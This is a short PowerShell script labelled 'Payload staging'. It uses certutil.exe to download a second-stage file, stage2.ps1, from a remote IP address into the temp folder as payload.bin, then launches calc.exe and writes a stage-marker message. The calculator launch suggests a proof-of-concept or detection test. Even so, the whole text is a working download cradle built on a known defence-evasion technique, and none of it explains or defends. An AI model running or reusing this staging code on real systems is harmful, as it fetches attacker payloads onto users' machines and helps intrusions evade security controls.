<# Payload staging #>
[CmdletBinding()]
param(
    [string]$EndpointUrl = 'https://192.0.2.179/stage2.ps1'
)
certutil.exe -urlcache -split -f $EndpointUrl "$env:TEMP\payload.bin"
Start-Process -FilePath "calc.exe"
Write-Verbose "stage marker 31 reached"
